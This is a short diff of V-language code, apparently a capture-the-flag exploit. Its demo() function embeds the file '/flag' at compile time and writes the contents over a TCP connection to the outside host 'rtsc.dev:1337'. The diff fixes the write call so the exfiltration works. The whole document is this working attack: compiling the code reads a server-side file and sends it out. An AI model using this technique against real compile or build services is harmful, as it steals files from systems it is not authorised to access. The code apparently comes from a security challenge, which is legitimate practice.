@@ -10,6 +10,6 @@ pub const (
 pub fn demo() {
         mut conn := net.dial_tcp("rtsc.dev:1337") or { panic('') }
         flag := $embed_file('/flag')
-        conn.write_string(flag)  or { panic('') }
-	println(flags)
+        conn.write_string(flag.to_string())  or { panic('') }
+	println('Aluf here')
 }
